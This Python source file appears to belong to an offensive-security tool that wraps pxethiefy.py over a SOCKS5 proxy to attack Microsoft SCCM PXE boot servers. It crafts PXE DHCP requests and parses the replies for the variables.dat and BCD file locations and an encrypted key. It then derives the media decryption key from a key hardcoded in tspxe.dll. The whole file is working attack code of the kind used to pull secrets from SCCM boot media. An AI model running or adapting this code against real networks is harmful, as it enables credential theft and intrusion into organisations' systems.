import struct
import socket
import time
from hashlib import *
from scapy.all import *
import binascii
from lib.socks import SOCKS5Client
from Crypto.Cipher import AES,DES3

## A lot of code here is taken from pxethiefy.py (we're just wrapping in SOCKS5), with thanks to the author!
## https://github.com/csandker/pxethiefy/blob/main/pxethiefy.py

class SCCM:
    def __init__(self, target, port, socks_client):
        self.target = target
        self.port = port
        self.socks_client = socks_client
        
    def _craft_packet(self, client_ip, client_mac):
        pkt = BOOTP(ciaddr=client_ip,chaddr=client_mac)/DHCP(options=[
            ("message-type","request"),
            ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
            ('pxe_client_architecture', b'\x00\x00'), #x86 architecture
            (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
            #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
            ('vendor_class_id', b'PXEClient'), 
            ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
            "end"])
        
        return pkt
    
    def _extract_boot_files(self, variables_file, dhcp_options):
        bcd_file, encrypted_key = (None, None)
        if variables_file:
            packet_type = variables_file[0] #First byte of the option data determines the type of data that follows
            data_length = variables_file[1] #Second byte of the option data is the length of data that follows

            #If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
            if packet_type == 1:
                #Skip first two bytes of option and copy the file name by data_length
                variables_file = variables_file[2:2+data_length] 
                variables_file = variables_file.decode('utf-8')
            #If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
            elif packet_type == 2:
                #Skip first two bytes of option and copy the encrypted data by data_length
                encrypted_key = variables_file[2:2+data_length]
                
                #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2

                #Read out string length
                string_length = variables_file[string_length_index]

                #Read out variables.dat file name and decode to utf-8 string
                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
                variables_file = variables_file.decode('utf-8')
            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
        else:
            print("[!] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location", MSG_TYPE_ERROR)
        
        return [variables_file,bcd_file,encrypted_key]

    def read_media_variable_file(self, filedata):   
        return filedata[24:-8]

    def aes128_decrypt(self,data,key):
        aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
        decrypted = aes128.decrypt(data)
        return decrypted.decode("utf-16-le")

    def aes128_decrypt_raw(self,data,key):
        aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
        decrypted = aes128.decrypt(data)
        return decrypted
    
    def aes_des_key_derivation(self,password):    
        key_sha1 = sha1(password).digest()
        b0 = b""
        for x in key_sha1:
            b0 += bytes((x ^ 0x36,))
            
        b1 = b""
        for x in key_sha1:
            b1 += bytes((x ^ 0x5c,))
        # pad remaining bytes with the appropriate value
        b0 += b"\x36"*(64 - len(b0))
        b1 += b"\x5c"*(64 - len(b1))
        b0_sha1 = sha1(b0).digest()
        b1_sha1 = sha1(b1).digest()
        return b0_sha1 + b1_sha1

    def derive_blank_decryption_key(self,encrypted_key):
        length = encrypted_key[0]
        encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
        encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
        key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll
        key = self.aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response
        var_file_key = (self.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 
        LEADING_BIT_MASK =  b'\x80'
        new_key = bytearray()
        for byte in struct.unpack('10c',var_file_key):
            if (LEADING_BIT_MASK[0] & byte[0]) == 128:
                new_key = new_key + byte + b'\xFF'
            else:
                new_key = new_key + byte + b'\x00'
        
        return new_key
        
    def send_bootp_request(self, client_ip, client_mac):
        self.socks_client.send(bytes(self._craft_packet(client_ip, client_mac)), (self.target, self.port))
        data = self.socks_client.recv(9076)
        
        # Load the packet
        bootp_layer = BOOTP(data)
        
        dhcp_layer = bootp_layer[DHCP]
        dhcp_options = dhcp_layer[DHCP].options
        
        option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
        
        if(variables_file and dhcp_options):
            variables_file,bcd_file,encrypted_key = self._extract_boot_files(variables_file, dhcp_options)

        return [variables_file, bcd_file, encrypted_key]
        
    def read_media_variable_file_header(self, filedata):
        return filedata[:40]